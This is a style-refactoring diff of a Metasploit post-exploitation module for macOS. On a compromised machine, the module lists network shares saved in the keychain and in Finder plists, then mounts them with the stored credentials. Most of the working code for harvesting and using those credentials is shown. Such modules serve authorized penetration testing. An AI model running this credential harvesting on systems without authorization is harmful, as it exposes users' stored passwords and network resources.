@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,46 +8,45 @@ require 'msf/core'
 require 'rex'
 
 class MetasploitModule < Msf::Post
-
   # list of accepted file share protocols. other "special" URLs (like vnc://) will be ignored.
-  FILE_SHARE_PROTOCOLS = %w(smb nfs cifs ftp afp)
+  FILE_SHARE_PROTOCOLS = %w(smb nfs cifs ftp afp).freeze
 
   # Used to parse a name property from a plist
-  NAME_REGEXES = [/^Name \= \"(.*)\"\;$/, /^Name \= (.*)\;$/]
+  NAME_REGEXES = [/^Name \= \"(.*)\"\;$/, /^Name \= (.*)\;$/].freeze
 
   # Used to parse a URL property from a plist
   URL_REGEX = /^URL = \"(.*)\"\;$/
 
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'OSX Network Share Mounter',
-        'Description'   => %q{
-          This module lists saved network shares and tries to connect to them using stored
-          credentials. This does not require root privileges.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-          [
-            'Peter Toth <globetother[at]gmail.com>',
-            'joev'
-          ],
-        'Platform'      => [ 'osx' ],
-        'SessionTypes'  => [ 'meterpreter', 'shell' ],
-        'Actions'       => [
-          [ 'LIST',    { 'Description' => 'Show a list of stored network share credentials' } ],
-          [ 'MOUNT',   { 'Description' => 'Mount a network shared volume using stored credentials' } ],
-          [ 'UMOUNT',  { 'Description' => 'Unmount a mounted volume' } ]
-        ],
-        'DefaultAction' => 'LIST'
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'OSX Network Share Mounter',
+                      'Description'   => %q(
+                        This module lists saved network shares and tries to connect to them using stored
+                        credentials. This does not require root privileges.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'Peter Toth <globetother[at]gmail.com>',
+                          'joev'
+                        ],
+                      'Platform'      => [ 'osx' ],
+                      'SessionTypes'  => [ 'meterpreter', 'shell' ],
+                      'Actions'       => [
+                        [ 'LIST',    { 'Description' => 'Show a list of stored network share credentials' } ],
+                        [ 'MOUNT',   { 'Description' => 'Mount a network shared volume using stored credentials' } ],
+                        [ 'UMOUNT',  { 'Description' => 'Unmount a mounted volume' } ]
+                      ],
+                      'DefaultAction' => 'LIST'))
 
     register_options(
       [
         OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),
         OptEnum.new('PROTOCOL', [true, 'Network share protocol.', 'smb', FILE_SHARE_PROTOCOLS])
-      ], self.class)
+      ], self.class
+    )
 
     register_advanced_options(
       [
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Post
     if action.name == 'LIST'
       if file?(security_path)
         saved_shares = get_keyring_shares(security_path)
-        if saved_shares.length == 0
+        if saved_shares.empty?
           print_status("No Network Share credentials were found in the keyrings")
         else
           print_status("Network shares saved in keyrings:")
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Post
       end
       if file?(sidebar_plist_path)
         favorite_shares = get_favorite_shares(sidebar_plist_path)
-        if favorite_shares.length == 0
+        if favorite_shares.empty?
           print_status("No favorite shares were found")
         else
           print_status("Favorite shares (without stored credentials):")
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Post
       end
       if file?(recent_plist_path)
         recent_shares = get_recent_shares(recent_plist_path)
-        if recent_shares.length == 0
+        if recent_shares.empty?
           print_status("No recent shares were found")
         else
           print_status("Recent shares (without stored credentials):")
@@ -108,7 +108,7 @@ class MetasploitModule < Msf::Post
         print_error("Could not check recent favorites contents: Recent plist not found")
       end
       mounted_shares = get_mounted_volumes
-      if mounted_shares.length == 0
+      if mounted_shares.empty?
         print_status("No volumes found in /Volumes")
       else
         print_status("Mounted Volumes:")
@@ -135,16 +135,14 @@ class MetasploitModule < Msf::Post
     # and their corresponding ptcl and srvr attributes
     list = []
     lines.each_with_index do |line, x|
-      if line =~ /"desc"<blob>=("Network Password"|<NULL>)/ && x < lines.length-2
-        # Remove everything up to the double-quote after the equal sign,
-        # and also the trailing double-quote
-        if lines[x+1].match "^.*\=\"(.*)\w*\"\w*$"
-          protocol = $1
-          if protocol.start_with?(*FILE_SHARE_PROTOCOLS) && lines[x+2].match("^.*\=\"(.*)\"\w*$")
-            server = $1
-            list.push(protocol + "\t" + server)
-          end
-        end
+      next unless line =~ /"desc"<blob>=("Network Password"|<NULL>)/ && x < lines.length - 2
+      # Remove everything up to the double-quote after the equal sign,
+      # and also the trailing double-quote
+      next unless lines[x + 1].match "^.*\=\"(.*)\w*\"\w*$"
+      protocol = Regexp.last_match(1)
+      if protocol.start_with?(*FILE_SHARE_PROTOCOLS) && lines[x + 2].match("^.*\=\"(.*)\"\w*$")
+        server = Regexp.last_match(1)
+        list.push(protocol + "\t" + server)
       end
     end
     list.sort
@@ -156,7 +154,7 @@ class MetasploitModule < Msf::Post
   def get_favorite_shares(sidebar_plist_path)
     # Grep for URL
     data = cmd_exec("defaults read #{sidebar_plist_path} favoriteservers")
-    list = data.lines.map(&:strip).map { |line| line =~ URL_REGEX && $1 }.compact
+    list = data.lines.map(&:strip).map { |line| line =~ URL_REGEX && Regexp.last_match(1) }.compact
 
     # Grep for EntryType and Name
     data = cmd_exec("defaults read #{sidebar_plist_path} favorites")
@@ -164,10 +162,8 @@ class MetasploitModule < Msf::Post
 
     # Go through the list, find the rows with EntryType 8 and their corresponding name
     lines.each_with_index do |line, x|
-      if line =~ /EntryType = 8;/ && x < lines.length-1
-        if NAME_REGEXES.any? { |r| lines[x+1].strip =~ r }
-          list.push($1)
-        end
+      if line =~ /EntryType = 8;/ && x < lines.length - 1
+        list.push(Regexp.last_match(1)) if NAME_REGEXES.any? { |r| lines[x + 1].strip =~ r }
       end
     end
 
@@ -179,7 +175,7 @@ class MetasploitModule < Msf::Post
   def get_recent_shares(recent_plist_path)
     # Grep for Name
     data = cmd_exec("defaults read #{recent_plist_path} Hosts")
-    data.lines.map(&:strip).map { |line| line =~ URL_REGEX && $1 }.compact.uniq.sort
+    data.lines.map(&:strip).map { |line| line =~ URL_REGEX && Regexp.last_match(1) }.compact.uniq.sort
   end
 
   # @return [Array<String>] sorted list of mounted volume names
@@ -210,7 +206,7 @@ class MetasploitModule < Msf::Post
   # @param [String] line the URL to parse and print formatted
   def print_uri(line)
     if line =~ /^(.*?):\/\/(.*)$/
-      print_good "  #{$1}\t#{$2}"
+      print_good "  #{Regexp.last_match(1)}\t#{Regexp.last_match(2)}"
     else
       print_good "  #{line}"
     end
